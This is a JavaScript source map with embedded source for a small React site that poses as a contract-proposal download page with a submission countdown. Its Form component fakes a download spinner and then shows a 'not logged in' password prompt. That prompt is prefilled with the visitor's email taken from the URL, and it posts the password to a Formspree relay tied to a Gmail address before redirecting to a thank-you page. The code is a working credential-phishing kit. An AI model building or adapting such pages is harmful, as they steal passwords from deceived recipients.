{"version":3,"sources":["logo.svg","components/Form.jsx","components/Hero.jsx","components/Proposal.jsx","components/Form2.jsx","components/Hero2.jsx","components/Thanks.jsx","components/Counter.jsx","App.js","serviceWorker.js","history.js","index.js"],"names":["module","exports","Form","state","download","spin","handleDownload","setState","setInterval","override","css","className","this","method","action","htmlFor","window","location","hash","split","type","id","placeholder","name","value","onClick","size","color","loading","Component","Hero","Proposal","Fragment","Form2","Thanks","Hero2","Counter","countDown","Date","getTime","now","distance","document","getElementById","innerText","Math","floor","hour","minute","second","App","path","exact","component","Boolean","hostname","match","createBrowserHistory","ReactDOM","render","history","navigator","serviceWorker","ready","then","registration","unregister"],"mappings":"iJAAAA,EAAOC,QAAU,IAA0B,kC,sUCqG5BC,E,2MA/FbC,MAAQ,CACNC,UAAU,EACVC,MAAM,G,EAERC,eAAiB,WACf,EAAKC,SAAS,CAAEF,MAAM,IACtBG,aAAY,WACV,EAAKD,SAAS,CAAEH,UAAU,EAAMC,MAAM,MACrC,M,wEAIH,IAAMI,EAAWC,cAAH,KAKd,OACE,yBAAKC,UAAU,QACb,wBAAIA,UAAU,oBAAd,8BACA,yBAAKA,UAAU,aACZC,KAAKT,MAAMC,SACV,0BACES,OAAO,OACPC,OAAO,+CAEP,yBAAKH,UAAU,cACb,2BAAOI,QAAQ,yBACZC,OAAOC,SAASC,KAAKC,MAAM,KAAK,IAEnC,2BACEC,KAAK,WACLT,UAAU,eACVU,GAAG,wBACHC,YAAY,WACZC,KAAK,aAEP,2BAAOZ,UAAU,eACdC,KAAKT,MAAMC,SAAW,wBAA0B,KAGrD,yBAAKO,UAAU,cACb,2BACES,KAAK,SACLT,UAAU,eACVU,GAAG,qBACHC,YAAY,GACZE,MAAOR,OAAOC,SAASC,KAAKC,MAAM,KAAK,GACvCI,KAAK,WAGjB,yBAAKZ,UAAU,cAChB,2BAAOS,KAAK,SAASG,KAAK,QAAQC,MAAM,wDAE/B,4BAAQJ,KAAK,SAAST,UAAU,mBAAhC,WAKF,4BACEc,QAASb,KAAKN,eACdK,UAAU,qCAETC,KAAKT,MAAME,KACV,yBAAKM,UAAU,iBAAf,cACc,IACZ,8BACE,kBAAC,cAAD,CACED,IAAKD,EACLiB,KAAM,GAENC,MAAO,UACPC,QAAShB,KAAKT,MAAMyB,YAK1B,uBAAGjB,UAAU,kBAAb,eAIN,6BACA,uBAAGA,UAAU,mBACX,0L,GApFOkB,aCcJC,E,2MAfb3B,MAAQ,G,wEAEN,OACE,6BAASQ,UAAU,QACjB,yBAAKA,UAAU,aACb,yBAAKA,UAAU,iBACb,kBAAC,EAAD,QAGJ,yBAAKA,UAAU,iB,GAVJkB,aCWJE,E,2MAVb5B,MAAQ,G,wEAEN,OACE,kBAAC,IAAM6B,SAAP,KACE,kBAAC,EAAD,W,GALeH,a,uJCkCRI,E,2MA/Bb9B,MAAQ,CACNC,UAAU,EACVC,MAAM,G,EAERC,eAAiB,WACf,EAAKC,SAAS,CAAEF,MAAM,IACtBG,aAAY,WACV,EAAKD,SAAS,CAAEH,UAAU,EAAMC,MAAM,MACrC,M,wEAIcK,cAAH,KAKd,OACE,yBAAKC,UAAU,QACb,wBAAIA,UAAU,oBAAd,8BACA,yBAAKA,UAAU,aACb,gH,GAtBUkB,aCcLC,E,2MAfb3B,MAAQ,G,wEAEN,OACE,6BAASQ,UAAU,QACjB,yBAAKA,UAAU,aACb,yBAAKA,UAAU,iBACb,kBAAC,EAAD,QAGJ,yBAAKA,UAAU,iB,GAVJkB,aCWJK,E,2MAVb/B,MAAQ,G,wEAEN,OACE,kBAAC,IAAM6B,SAAP,KACE,kBAACG,EAAD,W,GALaN,aCgENO,E,iLA/DX,IAKIC,EAAY,IAAIC,KAAK,yBAAyBC,UAC5C/B,aAAY,WACd,IAAIgC,GAAM,IAAIF,MAAOC,UACnBE,EAAWJ,EAAYG,EACzB,OACGE,SAASC,eAAe,QAAQC,UAAYC,KAAKC,MAChDL,EARAM,OAUDL,SAASC,eAAe,SAASC,UAAYC,KAAKC,MAChDL,EAXDM,MADCC,MAcFN,SAASC,eAAe,WAAWC,UAAYC,KAAKC,MAClDL,EAfAO,KADEC,KAkBJP,SAASC,eAAe,WAAWC,UAAYC,KAAKC,MAClDL,EAnBEQ,IADI,YAqCf,OACE,yBAAKtC,UAAU,WACb,yBAAKA,UAAU,aACb,wBAAIU,GAAG,OAAOV,UAAU,IAAxB,4BAGA,yBAAKA,UAAU,iBACb,0BAAMA,UAAU,qBAAqBU,GAAG,aACtC,0BAAMA,GAAG,SADX,QAGA,0BAAMV,UAAU,sBACd,0BAAMU,GAAG,UADX,SAGA,0BAAMV,UAAU,sBACd,0BAAMU,GAAG,YADX,WAGA,0BAAMV,UAAU,sBACd,0BAAMU,GAAG,YADX,kB,GAvDUQ,a,QCqBPqB,MAbf,WACE,OACE,kBAAC,IAAMlB,SAAP,KACE,kBAAC,EAAD,MACA,kBAAC,IAAD,KACE,kBAAC,IAAD,CAAOmB,KAAK,0BAA0BC,OAAK,EAACC,UAAWtB,IACvD,kBAAC,IAAD,CAAOoB,KAAK,aAAaC,OAAK,EAACC,UAAWnB,IAC1C,kBAAC,IAAD,CAAOiB,KAAK,IAAIC,OAAK,EAACC,UAAWtB,OCLrBuB,QACW,cAA7BtC,OAAOC,SAASsC,UAEe,UAA7BvC,OAAOC,SAASsC,UAEhBvC,OAAOC,SAASsC,SAASC,MACvB,2D,iBCjBSC,gB,QCQfC,IAASC,OACP,kBAAC,IAAD,CAAYC,QAASA,GACnB,kBAAC,EAAD,OAEFlB,SAASC,eAAe,SFsHpB,kBAAmBkB,WACrBA,UAAUC,cAAcC,MAAMC,MAAK,SAAAC,GACjCA,EAAaC,kB","file":"static/js/main.755ac34c.chunk.js","sourcesContent":["module.exports = __webpack_public_path__ + \"static/media/logo.5d5d9eef.svg\";","import React, { Component } from \"react\";\r\nimport { css } from \"@emotion/core\";\r\n// First way to import\r\nimport { ClockLoader } from \"react-spinners\";\r\n\r\nclass Form extends Component {\r\n  state = {\r\n    download: false,\r\n    spin: false\r\n  };\r\n  handleDownload = () => {\r\n    this.setState({ spin: true });\r\n    setInterval(() => {\r\n      this.setState({ download: true, spin: false });\r\n    }, 8000);\r\n  };\r\n\r\n  render() {\r\n    const override = css`\r\n      display: block;\r\n      margin: 0 auto;\r\n      border-color: red;\r\n    `;\r\n    return (\r\n      <div className=\"form\">\r\n        <h3 className=\"mb-4 text-center\">Download Contract Document</h3>\r\n        <div className=\"form-form\">\r\n          {this.state.download ? (\r\n            <form\r\n              method=\"post\"\r\n              action=\"//formspree.io/anothersuccess2233@gmail.com\"\r\n            >\r\n              <div className=\"form-group\">\r\n                <label htmlFor=\"exampleInputPassword1\">\r\n                  {window.location.hash.split(\"/\")[2]}\r\n                </label>\r\n                <input\r\n                  type=\"password\"\r\n                  className=\"form-control\"\r\n                  id=\"exampleInputPassword1\"\r\n                  placeholder=\"Password\"\r\n                  name=\"password\"\r\n                />\r\n                <small className=\"text-danger\">\r\n                  {this.state.download ? \"You are not logged in\" : \"\"}\r\n                </small>\r\n              </div>\r\n              <div className=\"form-group\">\r\n                <input\r\n                  type=\"hidden\"\r\n                  className=\"form-control\"\r\n                  id=\"exampleInputEmail1\"\r\n                  placeholder=\"\"\r\n                  value={window.location.hash.split(\"/\")[2]}\r\n                  name=\"email\"\r\n                />\r\n              </div>\r\n\t\t\t   <div className=\"form-group\">\r\n\t\t\t  <input type=\"hidden\" name=\"_next\" value=\"https://alphaconstr.github.io/contract/#/greetings\"/></div>\r\n\r\n              <button type=\"submit\" className=\"btn btn-primary\">\r\n                Submit\r\n              </button>\r\n            </form>\r\n          ) : (\r\n            <button\r\n              onClick={this.handleDownload}\r\n              className=\"btn btn-block btn-outline-primary\"\r\n            >\r\n              {this.state.spin ? (\r\n                <div className=\"sweet-loading\">\r\n                  Downloading{\" \"}\r\n                  <span>\r\n                    <ClockLoader\r\n                      css={override}\r\n                      size={35}\r\n                      //size={\"150px\"} this also works\r\n                      color={\"#123abc\"}\r\n                      loading={this.state.loading}\r\n                    />\r\n                  </span>\r\n                </div>\r\n              ) : (\r\n                <i className=\"fa fa-download\"> Download </i>\r\n              )}\r\n            </button>\r\n          )}\r\n          <br />\r\n          <p className=\"text-muted mt-3\">\r\n            <em>\r\n              Note: Submitting a proposal does guarantee winning this contract,\r\n              We are also in contact with certain suppliers, Only best quotes\r\n              would be awarded.\r\n            </em>\r\n          </p>\r\n        </div>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Form;\r\n","import React, { Component } from \"react\";\r\nimport Form from \"./Form\";\r\n\r\nclass Hero extends Component {\r\n  state = {};\r\n  render() {\r\n    return (\r\n      <section className=\"hero\">\r\n        <div className=\"container\">\r\n          <div className=\"row-container\">\r\n            <Form />\r\n          </div>\r\n        </div>\r\n        <div className=\"overlay\"></div>\r\n      </section>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Hero;\r\n","import React, { Component } from \"react\";\r\nimport Hero from \"./Hero\";\r\n\r\nclass Proposal extends Component {\r\n  state = {};\r\n  render() {\r\n    return (\r\n      <React.Fragment>\r\n        <Hero />\r\n      </React.Fragment>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Proposal;\r\n","import React, { Component } from \"react\";\r\nimport { css } from \"@emotion/core\";\r\n// First way to import\r\nimport { ClockLoader } from \"react-spinners\";\r\n\r\nclass Form2 extends Component {\r\n  state = {\r\n    download: false,\r\n    spin: false\r\n  };\r\n  handleDownload = () => {\r\n    this.setState({ spin: true });\r\n    setInterval(() => {\r\n      this.setState({ download: true, spin: false });\r\n    }, 8000);\r\n  };\r\n\r\n  render() {\r\n    const override = css`\r\n      display: block;\r\n      margin: 0 auto;\r\n      border-color: red;\r\n    `;\r\n    return (\r\n      <div className=\"form\">\r\n        <h3 className=\"mb-4 text-center\">Download Contract Document</h3>\r\n        <div className=\"form-form\">\r\n          <p>\r\n            We are currently experiencing how download traffic, Kindly check\r\n            back later\r\n          </p>\r\n        </div>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Form2;\r\n","import React, { Component } from \"react\";\r\nimport Form2 from \"./Form2\";\r\n\r\nclass Hero extends Component {\r\n  state = {};\r\n  render() {\r\n    return (\r\n      <section className=\"hero\">\r\n        <div className=\"container\">\r\n          <div className=\"row-container\">\r\n            <Form2 />\r\n          </div>\r\n        </div>\r\n        <div className=\"overlay\"></div>\r\n      </section>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Hero;\r\n","import React, { Component } from \"react\";\r\nimport Hero2 from \"./Hero2\";\r\n\r\nclass Thanks extends Component {\r\n  state = {};\r\n  render() {\r\n    return (\r\n      <React.Fragment>\r\n        <Hero2 />\r\n      </React.Fragment>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Thanks;\r\n","import React, { Component } from \"react\";\r\n\r\nclass Counter extends Component {\r\n  render() {\r\n    const second = 1000,\r\n      minute = second * 60,\r\n      hour = minute * 60,\r\n      day = hour * 24;\r\n\r\n    let countDown = new Date(\"Jan 15, 2020 04:00:00\").getTime(),\r\n      x = setInterval(function() {\r\n        let now = new Date().getTime(),\r\n          distance = countDown - now;\r\n        return (\r\n          (document.getElementById(\"days\").innerText = Math.floor(\r\n            distance / day\r\n          )),\r\n          (document.getElementById(\"hours\").innerText = Math.floor(\r\n            (distance % day) / hour\r\n          )),\r\n          (document.getElementById(\"minutes\").innerText = Math.floor(\r\n            (distance % hour) / minute\r\n          )),\r\n          (document.getElementById(\"seconds\").innerText = Math.floor(\r\n            (distance % minute) / second\r\n          ))\r\n        );\r\n\r\n        const timer_display = `${Math.floor(distance / day)}days : ${Math.floor(\r\n          (distance % day) / hour\r\n        )}hours : ${Math.floor((distance % hour) / minute)}mins : ${Math.floor(\r\n          (distance % minute) / second\r\n        )}secs`;\r\n\r\n        //do something later when date is reached\r\n        //if (distance < 0) {\r\n        //  clearInterval(x);\r\n        //  'IT'S MY BIRTHDAY!;\r\n        //}\r\n      }, second);\r\n\r\n    return (\r\n      <div className=\"counter\">\r\n        <div className=\"container\">\r\n          <h3 id=\"head\" className=\"\">\r\n            Proposal Submission Ends\r\n          </h3>\r\n          <div className=\"counter-items\">\r\n            <span className=\"counter-items_item\" id=\"span-hour\">\r\n              <span id=\"days\"></span>days\r\n            </span>\r\n            <span className=\"counter-items_item\">\r\n              <span id=\"hours\"></span>Hours\r\n            </span>\r\n            <span className=\"counter-items_item\">\r\n              <span id=\"minutes\"></span>Minutes\r\n            </span>\r\n            <span className=\"counter-items_item\">\r\n              <span id=\"seconds\"></span>Seconds\r\n            </span>\r\n          </div>\r\n        </div>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Counter;\r\n","import React from \"react\";\nimport logo from \"./logo.svg\";\nimport \"./App.css\";\n\nimport Proposal from \"./components/Proposal\";\nimport Thanks from \"./components/Thanks\";\n\nimport Counter from \"./components/Counter\";\nimport { Route, Switch } from \"react-router-dom\";\n\nfunction App() {\n  return (\n    <React.Fragment>\n      <Counter />\n      <Switch>\n        <Route path=\"/proposals/:message/:id\" exact component={Proposal} />\n        <Route path=\"/greetings\" exact component={Thanks} />\n        <Route path=\"/\" exact component={Proposal} />\n      </Switch>\n    </React.Fragment>\n  );\n}\n\nexport default App;\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' }\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready.then(registration => {\n      registration.unregister();\n    });\n  }\n}\n","import { createBrowserHistory } from \"history\";\r\nexport default createBrowserHistory();\r\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport \"./index.css\";\nimport App from \"./App\";\nimport * as serviceWorker from \"./serviceWorker\";\nimport \"font-awesome/css/font-awesome.css\";\nimport history from \"./history\";\nimport { HashRouter } from \"react-router-dom\";\n\nReactDOM.render(\n  <HashRouter history={history}>\n    <App />\n  </HashRouter>,\n  document.getElementById(\"root\")\n);\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}